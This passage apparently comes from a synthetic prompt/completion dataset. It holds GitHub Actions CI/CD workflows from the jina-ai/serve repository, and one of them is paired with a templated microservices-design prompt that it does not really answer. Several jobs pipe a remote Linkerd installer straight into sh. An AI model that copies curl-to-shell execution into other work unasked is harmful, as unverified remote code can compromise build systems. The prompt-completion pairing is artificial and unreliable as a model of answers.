platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Update version\n        run: |\n          DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n          RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n          INIT_FILE='jina/__init__.py'\n          DEV_VER=$RELEASE_VER\".dev\"$DEVDELTA\n          echo \"DEVDELTA $DEVDELTA\"\n          echo \"RELEASE_VER $RELEASE_VER\"\n          echo \"DEV_VER $DEV_VER\"\n          if [[ \"${{ matrix.os }}\" == \"macos-latest\" ]]; then\n            sed -i '' '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n          else\n            sed -i '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n          fi\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        if: ${{ matrix.os == 'ubuntu-latest' }}\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons ${{ matrix.python-manylinux-tag }}\n\n      - name: Build wheels with cibuildwheels on macos\n        env:\n          CIBW_BUILD: cp${{ matrix.python-cibuildwheels }}-${{ matrix.platform_id }}\n          CIBW_ARCHS: ${{ matrix.arch }}\n          CIBW_TEST_COMMAND: python -c \"import jina; import jraft\"\n          CIBW_BUILD_VERBOSITY: 1\n          GOARCH: ${{ matrix.goarch }}\n          CGO_ENABLED: 1\n        if: ${{ matrix.os == 'macos-latest' }}\n        run: |\n          python -m cibuildwheel --output-dir dist\n\n      - name: Upload wheels as artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: artifacts-${{ strategy.job-index }}\n          path: dist/*.whl\n\n# comment for now, do it manually if needed\n  # pre-release:\n  #   if: |\n  #     !startsWith(github.event.head_commit.message, 'chore') &&\n  #     !startsWith(github.event.head_commit.message, 'build: hotfix') &&\n  #     !endsWith(github.event.head_commit.message, 'reformatted by jina-dev-bot')\n  #   needs: [build-wheels, mark-dev-N]\n  #   runs-on: ubuntu-latest\n  #   steps:\n  #     - uses: actions/checkout@v2.5.0\n  #       with:\n  #         #          submodules: true\n  #         fetch-depth: 100\n  #     - run: |\n  #         truncate --size=24KB README.md > README-trunc.md\n  #     - uses: actions/download-artifact@v3\n  #       with:\n  #         name: artifact\n  #         path: dist\n\n  #     - name: Update version\n  #       run: |\n  #         DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n  #         RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n  #         INIT_FILE='jina/__init__.py'\n  #         DEV_VER=$RELEASE_VER\".dev\"$DEVDELTA\n  #         echo \"DEVDELTA $DEVDELTA\"\n  #         echo \"RELEASE_VER $RELEASE_VER\"\n  #         echo \"DEV_VER $DEV_VER\"\n  #         sed -i '/'\"${RELEASE_VER}\"'/s/.*/'\"__version__ = '${DEV_VER}'\"'/' \"${INIT_FILE}\"\n  #     - name: Pre-release (.devN)\n  #       run: |\n  #         pip install twine wheel\n  #         ./scripts/release.sh\n  #       env:\n  #         TWINE_USERNAME: ${{ secrets.TWINE_USERNAME }}\n  #         TWINE_PASSWORD: ${{ secrets.TWINE_PASSWORD }}\n  #         JINA_SLACK_WEBHOOK: ${{ secrets.JINA_SLACK_WEBHOOK }}\n\n  core-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        test-path: ${{fromJson(needs.prep-testbed.outputs.matrix)}}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          pip install grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/docarray_v2/*' --ignore-glob='tests/integration/stateful/*' --ignore-glob='tests/integration/hub_usage/dummyhub*' ${{ matrix.test-path }}\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINAHUB_USERNAME: ${{ secrets.JINAHUB_USERNAME }}\n          JINAHUB_PASSWORD: ${{ secrets.JINAHUB_PASSWORD }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check file existence\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  import-test:\n    runs-on: ubuntu-latest\n    needs: update-schema\n    strategy:\n      fail-fast: false\n      matrix:\n        core: ['', 'true']\n        perf: ['', 'true']\n        python-version: [\"3.8\", \"3.9\", \"3.10\", \"3.11\"]\n        exclude: \n          - core: 'true'\n            perf: 'true'\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-env }}\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install --no-cache-dir .\n          pip list\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests,Client,Flow,dynamic_batching,Document,DocumentArray'\n  docker-image-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n        ports:\n          - 5000:5000\n    strategy:\n      fail-fast: false\n      matrix:\n        test-arch: [\"linux/amd64\", \"linux/arm64\"]\n    steps:\n      #      - name: Cancel Previous Runs\n      #        uses: styfle/cancel-workflow-action@0.9.0\n      #        with:\n      #          access_token: ${{ github.token }}\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Docker Buildx\n        id: buildx\n        uses: docker/setup-buildx-action@v1\n        with:\n          install: true\n          driver-opts: network=host\n      - run: |\n          docker run --privileged --rm tonistiigi/binfmt --uninstall qemu-aarch64\n          docker run --rm --privileged tonistiigi/binfmt --install all\n      - name: Build and test\n        uses: docker/build-push-action@v2\n        with:\n          context: .\n          file: Dockerfiles/debianx.Dockerfile\n          platforms: ${{ matrix.test-arch }}\n          push: true\n          tags: localhost:5000/jina/multiarch:latest\n          target: jina\n      - run: |\n          docker run --platform ${{ matrix.test-arch }} localhost:5000/jina/multiarch:latest -v\n\n  k8s-flow-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Flow\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_flow.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-deployment-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Deployment\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_deployment.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-graceful-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test graceful request handling on k8s\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_graceful_request_handling.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-failures-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s failures\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          curl --proto '=https' --tlsv1.2 -sSfL https://linkerd.github.io/linkerd-smi/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_failures.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-otel-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test K8s with OpenTelemetry\n        run: |\n          pytest -v -s --cov=jina --cov-report=xml ./tests/k8s_otel\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  docker-compose-test:\n    needs: update-schema\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test docker compose\n        run: |\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/docker_compose/test_*.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  benchmark-pre-release:\n    runs-on: ubuntu-latest\n    needs: [update-schema, mark-dev-N]\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 200\n      - run: |\n          DEVDELTA=${{needs.mark-dev-N.outputs.devdelta}}\n          RELEASE_VER=${{needs.mark-dev-N.outputs.releasever}}\n          NEXT_VER=$RELEASE_VER\".dev\"$COMMITS_SINCE_LAST_VER\n          echo \"NEXT_VER=$NEXT_VER\" >> $GITHUB_ENV\n      - uses: benc-uk/workflow-dispatch@v1\n        with:\n          token: ${{ secrets.JINA_DEV_BOT }}\n          workflow: Benchmark Jina\n          repo: jina-ai/jina-terraform\n          ref: \"main\"\n          inputs: '{ \"pypi_releases\": \"[\\\"${{ env.NEXT_VER }}\\\"]\"}'\n  # just for blocking the merge until all parallel core-test are successful\n  success-all-steps:\n    runs-on: ubuntu-latest\n    needs: [core-test, docarray-v-two-test, stateful-docarray-v-two-test, import-test, k8s-flow-test, k8s-deployment-test, k8s-graceful-test, k8s-failures-test, k8s-otel-test, docker-compose-test, docker-image-test, benchmark-pre-release, update-schema, update-docker] #, pre-release]\n    if: always()\n    steps:\n      - uses: technote-space/workflow-conclusion-action@v2\n      - name: Check Failure\n        if: env.WORKFLOW_CONCLUSION == 'failure'\n        run: exit 1\n      - name: Success\n        if: ${{ success() }}\n        run: echo \"All Done\"\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/cd.yml", "language": "yaml", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 876}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CI\n\non:\n  pull_request:\n    paths-ignore:\n      - 'docs/**'\n      - 'README.md'\n\n#on:\n#  push:\n#    branches-ignore:\n#      - '**'  # temporally ignore all\njobs:\n  commit-lint:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - uses: wagoid/commitlint-github-action@v3\n\n  lint-flake-8:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Lint with flake8\n        run: |\n          pip install flake8\n          # stop the build if there are Python syntax errors or undefined names\n          flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics --exclude .git,__pycache__,docs/source/conf.py,old,build,dist,tests/,jina/resources/,jina/proto/docarray_v1,jina/proto/docarray_v2,jina/serve/consensus/add_voter/pb,jina/serve/consensus/add_voter/pb2\n          # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide\n          flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics --exclude .git,__pycache__,docs/source/conf.py,old,build,dist,tests/,jina/proto/docarray_v1,jina/proto/docarray_v2,jina/serve/consensus/add_voter/pb,jina/serve/consensus/add_voter/pb2\n\n  check-docstring:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v2\n        with:\n          python-version: \"3.10\"\n      - id: file_changes\n        uses: Ana06/get-changed-files@v1.2\n      - name: docstring check with darglint and pydocstyle\n        run: ./scripts/docstrings_lint.sh\n        env:\n          CHANGED_FILES: ${{ steps.file_changes.outputs.added_modified }}\n\n  check-black:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - id: file_changes\n        uses: Ana06/get-changed-files@v1.2\n      - name: check black\n        run: ./scripts/black.sh\n        env:\n          CHANGED_FILES: ${{ steps.file_changes.outputs.added_modified }}\n\n  code-injection:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          token: ${{ secrets.GITHUB_TOKEN }}\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          python-version: \"3.10\"\n      - name: Styling\n        id: styling\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        run: |\n          git config --local user.email \"dev-bot@jina.ai\"\n          git config --local user.name \"Jina Dev Bot\"\n          pip install \".[devel,black]\"\n          pip install setuptools\n          cd scripts && bash ./devbot.sh && cd -\n          if [[ -z $(git status -s) ]]\n          then\n            echo \"tree is clean\"\n          else\n            git add -u\n            git commit -m \"style: fix overload and cli autocomplete\"\n            echo \"IS_CHANGED=YES\" >> $GITHUB_OUTPUT\n          fi\n      - name: Push changes to head ref\n        uses: ad-m/github-push-action@v0.6.0\n        if: ${{ !github.event.pull_request.head.repo.fork }}\n        with:\n          github_token: ${{ secrets.JINA_DEV_BOT }}\n          branch: ${{ github.head_ref }}\n      - name: Fail this pipelint\n        if: ${{ steps.styling.outputs.IS_CHANGED == 'YES' && !github.event.pull_request.head.repo.fork }}\n        run: exit 1\n\n  docker-image-test:\n    needs: [code-injection]\n    runs-on: ubuntu-latest\n    services:\n      registry:\n        image: registry:2\n        ports:\n          - 5000:5000\n    strategy:\n      fail-fast: false\n      matrix:\n        test-arch: [\"linux/amd64\", \"linux/arm64\"]\n    steps:\n#      - name: Cancel Previous Runs\n#        uses: styfle/cancel-workflow-action@0.9.0\n#        with:\n#          access_token: ${{ github.token }}\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Docker Buildx\n        id: buildx\n        uses: docker/setup-buildx-action@v1\n        with:\n          install: true\n          driver-opts: network=host\n      - run: |\n          docker run --privileged --rm tonistiigi/binfmt --uninstall qemu-aarch64\n          docker run --rm --privileged tonistiigi/binfmt --install all\n      - name: Build and test\n        uses: docker/build-push-action@v2\n        with:\n          context: .\n          file: Dockerfiles/debianx.Dockerfile\n          platforms: ${{ matrix.test-arch }}\n          push: true\n          tags: localhost:5000/jina/multiarch:latest\n          target: jina\n      - run: |\n          docker run --platform ${{ matrix.test-arch }} localhost:5000/jina/multiarch:latest -v\n\n  k8s-flow-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Flow\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_flow.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-deployment-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s Deployment\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_deployment.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-graceful-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test graceful request handling on k8s\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina 